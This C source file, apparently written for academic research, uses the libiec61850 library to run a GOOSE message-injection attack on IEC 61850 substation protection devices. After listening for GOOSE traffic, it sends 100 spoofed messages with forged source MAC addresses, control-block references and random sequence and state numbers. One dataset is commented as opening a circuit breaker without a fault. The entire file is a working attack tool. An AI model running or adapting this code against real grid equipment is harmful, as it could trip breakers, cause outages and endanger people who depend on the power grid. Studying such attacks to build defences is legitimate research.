/*This was coded by Johnatan Oliveira for academic purposes and uses functions and libraries of functions
from the libiec61850 library for GOOSE message handling and network 
monitoring by Michael Zillgith https://libiec61850.com/, the libIEC61850 is released under the GPLv3. */


#include "goose_receiver.h"
#include "goose_subscriber.h"
#include "hal_thread.h"
#include "mms_value.h"
#include "goose_publisher.h"

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>

static int running = 1;

int numero = 5;
int cont = 0;
int* ponteiro;

//char vlanTag;
int16_t vlanId;
int8_t vlanPrio;
int32_t appId;

uint8_t macBuf[6];
uint8_t macsrcBuf[6];
uint8_t macsrcBuf1;
uint8_t macsrcBuf2;
uint8_t macsrcBuf3;
uint8_t macsrcBuf4;
uint8_t macsrcBuf5;
uint8_t macsrcBuf6;


uint8_t macdstBuf1;
uint8_t macdstBuf2;
uint8_t macdstBuf3;
uint8_t macdstBuf4;
uint8_t macdstBuf5;
uint8_t macdstBuf6;

char goId[60];
char goCbRef[60];
char dataSet[60];
uint32_t confRev;
char ndsCom[60];
char simul[60];
uint32_t stNum;
uint32_t sqNum;
uint32_t timeToLive;


void sigint_handler(int signalId)
{
    running = 0;
}

int
main(int argc, char** argv)
{
    
    GooseReceiver receiver = GooseReceiver_create();

    //Set interface
    if (argc > 1) {
        printf("Set interface id: %s\n", argv[1]);
        GooseReceiver_setInterfaceId(receiver, argv[1]);
    }
    else {
        printf("Using interface 3\n");
        GooseReceiver_setInterfaceId(receiver, "4");
    }
    ponteiro = &cont;
    GooseSubscriber subscriber = GooseSubscriber_create("", NULL);
    GooseSubscriber_setObserver(subscriber);

    GooseReceiver_addSubscriber(receiver, subscriber);

    GooseReceiver_start(receiver);
    char data[60];
    if (GooseReceiver_isRunning(receiver)) {
        signal(SIGINT, sigint_handler);

        while (running) {
            Thread_sleep(100);
            if (cont == 1) {
                printf("Confirmed");
                break;
            }
            else {
                printf("\nNot Confirmed: %d\n", strlen(dataSet));
            }

        }
    }
    else {
        printf("Failed to start GOOSE subscriber.\n");
    }

    GooseReceiver_stop(receiver);

    GooseReceiver_destroy(receiver);
    

    char* interface;

    if (argc > 1)
        interface = argv[1];
    else
        interface = "4";

    printf("Using interface %s\n", interface);


    LinkedList dataSetValues1 = LinkedList_create();
    LinkedList dataSetValues2 = LinkedList_create();

    // Define the first Dataset parameters
    LinkedList_add(dataSetValues1, MmsValue_newBoolean(true)); //Open the circuit breaker without an electrical fault
    LinkedList_add(dataSetValues1, MmsValue_newBoolean(false));
    LinkedList_add(dataSetValues1, MmsValue_newBoolean(false));

    // Define the second dataset parameters
    LinkedList_add(dataSetValues2, MmsValue_newBoolean(true));

    //Create the **CommParameters** to store the GOOSE protocol values. Variable used in the **libiec61850** library.
    CommParameters gooseCommParameters;
    CommParameters gooseCommParameters2;


    //Destination and source addresses identified by the attacker by monitoring the network of the IEDs
    gooseCommParameters.appId = 0x1014;
    gooseCommParameters.dstAddress[0] = 0x01;
    gooseCommParameters.dstAddress[1] = 0x0c;
    gooseCommParameters.dstAddress[2] = 0xcd;
    gooseCommParameters.dstAddress[3] = 0x01;
    gooseCommParameters.dstAddress[4] = 0x00;
    gooseCommParameters.dstAddress[5] = 0x14;
    gooseCommParameters.vlanId = 1;
    gooseCommParameters.vlanPriority = 4;

    gooseCommParameters.srcAddress[0] = 0x00;
    gooseCommParameters.srcAddress[1] = 0x30;
    gooseCommParameters.srcAddress[2] = 0xa7;
    gooseCommParameters.srcAddress[3] = 0x29;
    gooseCommParameters.srcAddress[4] = 0x1f;
    gooseCommParameters.srcAddress[5] = 0x5a;


    gooseCommParameters2.appId = 0x1013;
    gooseCommParameters2.dstAddress[0] = 0x01;
    gooseCommParameters2.dstAddress[1] = 0x0c;
    gooseCommParameters2.dstAddress[2] = 0xcd;
    gooseCommParameters2.dstAddress[3] = 0x01;
    gooseCommParameters2.dstAddress[4] = 0x00;
    gooseCommParameters2.dstAddress[5] = 0x13;
    gooseCommParameters2.vlanId = 1;
    gooseCommParameters2.vlanPriority = 4;

    gooseCommParameters2.srcAddress[0] = 0x00;
    gooseCommParameters2.srcAddress[1] = 0x50;
    gooseCommParameters2.srcAddress[2] = 0xc2;
    gooseCommParameters2.srcAddress[3] = 0x4f;
    gooseCommParameters2.srcAddress[4] = 0x9d;
    gooseCommParameters2.srcAddress[5] = 0xcd;

  
    
    //Setting the limits of time to send a GOOSE message randomly
    int intervalo_sup_sleep = 30000, intervalo_inf_sleep = 5000;
    int limit_inf_sq = 0, limit_sup_sq = 15000;
    int limit_inf_st = 0, limit_sup_st = 2000;
    int intervalo_sleep = 0;
    int cont_msg_IED1 = 0;
    int cont_msg_IED2 = 0;
    int aleatorio = 0;

   
    int i = 0;
    
    srand(time(NULL));


    for (i = 0; i < 100; i++) {
        aleatorio = rand(); //random function to determine the time to send the message
        printf("Aleatorio: %d \n", aleatorio);
        printf("cont_msg_IED1: %d \n", cont_msg_IED1);
        printf("cont_msg_IED2: %d \n", cont_msg_IED2);

        //conditions to attack one of the to IEDs targeted of the digital substation
        if ((aleatorio % 2 == 0 && cont_msg_IED1 < 50) || (cont_msg_IED2 >= 50 && cont_msg_IED1 < 50)) {
            GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);
            GoosePublisher_setGoCbRef(publisher, "SEL_421_distCFG/LLN0$GO$CB_disj1");
            GoosePublisher_setConfRev(publisher, 1);
            GoosePublisher_setGoID(publisher, "Prot_disj1");
            GoosePublisher_setTimeAllowedToLive(publisher, 2000);
            GoosePublisher_setDataSetRef(publisher, "SEL_421_distCFG/LLN0$dataset_disj");

            //define the random values of the sqNum and stNum
            sqNum = (rand() % (limit_sup_sq - limit_inf_sq + 1) + limit_inf_sq);
            stNum = (rand() % (limit_sup_st - limit_inf_st + 1) + limit_inf_st);
            
            //show the data in the terminal screen
            printf("IED 1 FISICO\n"); 
            printf("SQNUM: %d \n", sqNum);
            printf("STNUM: %d \n\n", stNum);
            printf("Mensagem: %d \n\n", i + 1);
            GoosePublisher_setSqNum(publisher, sqNum);
            GoosePublisher_setStNum(publisher, stNum);

            intervalo_sleep = (rand() % (intervalo_sup_sleep - intervalo_inf_sleep + 1) + intervalo_inf_sleep);
            Thread_sleep(intervalo_sleep);
            printf("\nPUBLICADO\n");

            GoosePublisher_publish(publisher, dataSetValues1);
            GoosePublisher_destroy(publisher);
            cont_msg_IED1 += 1;
        }
        else if ((aleatorio % 2 != 0 && cont_msg_IED2 < 50) || (cont_msg_IED1 >= 50 && cont_msg_IED2 < 50)) {
            GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters2, interface);
            GoosePublisher_setGoCbRef(publisher, "ied_protecaoPROT/LLN0$GO$trip2_dataset");
            GoosePublisher_setConfRev(publisher, 1);
            GoosePublisher_setGoID(publisher, "rtds");
            GoosePublisher_setTimeAllowedToLive(publisher, 4000);
            GoosePublisher_setDataSetRef(publisher, "ied_protecaoPROT/LLN0$trip2_dataset");

            //Determines the random values of sqNum and stNum values
            sqNum = (rand() % (limit_sup_sq - limit_inf_sq + 1) + limit_inf_sq);
            stNum = (rand() % (limit_sup_st - limit_inf_st + 1) + limit_inf_st);


            printf("IED 2 Virtual\n");
            printf("SQNUM: %d \n", sqNum);
            printf("STNUM: %d \n\n", stNum);
            printf("Mensagem: %d \n\n", i + 1);
            GoosePublisher_setSqNum(publisher, sqNum);
            GoosePublisher_setStNum(publisher, stNum);

            intervalo_sleep = (rand() % (intervalo_sup_sleep - intervalo_inf_sleep + 1) + intervalo_inf_sleep);
            Thread_sleep(intervalo_sleep);
            printf("\nPUBLICADO\n");

            GoosePublisher_publish(publisher, dataSetValues2);
            GoosePublisher_destroy(publisher);
            cont_msg_IED2 += 1;
        }
        else {
            break;
        }


    }
    printf("\n Message Injection attack \n");


    LinkedList_destroyDeep(dataSetValues1, (LinkedListValueDeleteFunction)MmsValue_delete);
    LinkedList_destroyDeep(dataSetValues2, (LinkedListValueDeleteFunction)MmsValue_delete);


    return 0;
}

